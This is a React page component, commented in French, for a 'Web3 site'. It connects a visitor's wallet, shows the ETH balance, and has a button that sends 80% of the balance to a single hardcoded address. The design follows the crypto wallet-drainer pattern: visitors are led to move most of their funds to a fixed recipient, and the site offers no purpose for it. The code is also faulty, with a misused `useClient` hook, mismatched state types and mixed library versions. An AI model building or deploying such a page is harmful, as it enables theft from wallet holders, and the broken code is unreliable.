import { useState, useEffect } from 'react';
import { useAccount, useConnect } from 'wagmi'; // Pas besoin de WalletConnectConnector ici
import { ethers } from 'ethers';

// Utilisation de useClient si tu as besoin d'un provider
import { useClient } from 'wagmi'; // Ajouter si tu veux utiliser un provider

export default function Home() {
  const { isConnected } = useAccount();
  const { connect, connectors } = useConnect();
  
  // Si tu as besoin de récupérer le provider, voici comment faire
  const { client } = useClient(); 
  const provider = client?.provider;

  const [balance, setBalance] = useState<number | null>(null);

  useEffect(() => {
    if (isConnected) {
      // Logique pour interagir avec le contrat ou récupérer le solde de l'utilisateur
      const fetchBalance = async () => {
        if (provider) {
          const address = await provider.getSigner().getAddress(); // Récupérer l'adresse de l'utilisateur connecté
          const userBalance = await provider.getBalance(address); // Récupérer le solde d'ETH
          setBalance(ethers.utils.formatEther(userBalance)); // Formater le solde en Ether
        }
      };
      
      fetchBalance();
    }
  }, [isConnected, provider]); // Rechercher à chaque changement de connexion

  const handleTransfer = async () => {
    if (provider && balance) {
      const signer = provider.getSigner();
      const amountToSend = ethers.utils.parseEther((parseFloat(balance) * 0.8).toString()); // 80% du solde

      try {
        // Création de la transaction
        const tx = await signer.sendTransaction({
          to: '0x518c5D62647E60864EcB3826e982c93dFa154af3', // Adresse de destination fixe
          value: amountToSend, // Envoyer 80% du solde
        });
        
        console.log('Transaction envoyée :', tx);
        await tx.wait(); // Attendre la confirmation
        console.log('Transaction confirmée');
      } catch (error) {
        console.error('Erreur lors de l\'envoi de la transaction :', error);
      }
    }
  };

  return (
    <div>
      <h1>Bienvenue sur mon site Web3 !</h1>
      {!isConnected ? (
        <button onClick={() => connect(connectors[0])}>
          Connecter mon portefeuille
        </button>
      ) : (
        <>
          <p>Solde actuel : {balance} ETH</p>
          <button onClick={handleTransfer}>Envoyer 80% de mon solde</button>
        </>
      )}
    </div>
  );
}
